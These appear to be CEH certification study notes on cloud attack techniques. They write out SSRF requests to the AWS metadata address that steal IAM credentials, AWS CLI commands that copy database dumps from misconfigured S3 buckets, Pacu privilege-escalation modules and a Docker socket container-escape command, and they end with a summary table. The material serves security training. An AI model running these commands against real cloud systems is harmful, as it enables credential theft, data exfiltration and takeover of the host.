# 02. Attack Techniques — Cloud Computing

> [!WARNING] ⚡ **Exploitation Methodologies & Execution Scenarios**
> Direct extraction from official CEH v13 Syllabus (Module 19). Covers S3 Bucket Enumeration & Exfiltration, SSRF Cloud Metadata IAM Credential Theft (`169.254.169.254`), Pacu AWS Exploitation Framework, Container Escape, and Kubernetes API Exploitation.

---

## ⚔️ 1. Primary Cloud Exploitation Workflows

### 1.1 SSRF AWS Metadata IAM Secret Key Exfiltration Workflow
In cloud environments, web applications with Server-Side Request Forgery (SSRF) allow attackers to query the internal Link-Local Metadata Address:

```http
# Step 1: Query AWS Metadata Instance Identity
GET /fetch.php?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1

# Step 2: Extract Active IAM Role Name
GET /fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1

# Step 3: Retrieve Temporary AccessKeyId, SecretAccessKey, and Token
GET /fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/DevAdminRole HTTP/1.1
```

Attackers configure the extracted credentials in their local AWS CLI (`aws configure`) to take over cloud resources remotely.

### 1.2 AWS S3 Bucket Enumeration & Public Exfiltration Syntax
```bash
# 1. Enumerate unauthenticated public S3 bucket via AWS CLI
aws s3 ls s3://target-company-backup --no-sign-request

# 2. Exfiltrate sensitive database dumps from misconfigured bucket
aws s3 cp s3://target-company-backup/database.sql . --no-sign-request
```

### 1.3 AWS Post-Exploitation via Pacu Framework
```bash
# Launch Pacu AWS Exploitation Framework
pacu

# Enumerate AWS IAM user permissions and privilege escalation paths
exec iam__enum_permissions
exec iam__privesc_scan
```

> [!DANGER] 🛡️ **📋 Comprehensive Cloud Attack Execution Matrix**

| Attack Type | Cloud Target | Command / Tool Syntax | Technical Outcome |
| :--- | :--- | :--- | :--- |
| **SSRF Metadata Theft**| AWS IMDSv1 | `curl http://169.254.169.254/...` | Steals AWS IAM secret keys |
| **Public Bucket Exfil**| AWS S3 / Azure Blob | `aws s3 sync s3://bucket .` | Discloses internal databases |
| **AWS PrivEsc** | AWS IAM | `pacu` -> `iam__privesc_scan` | Escalates to AdministratorAccess |
| **Docker Container Escape**| Docker Socket | `docker -H unix:///var/run/docker.sock run -v /:/host ...` | Gains full root access on host OS |
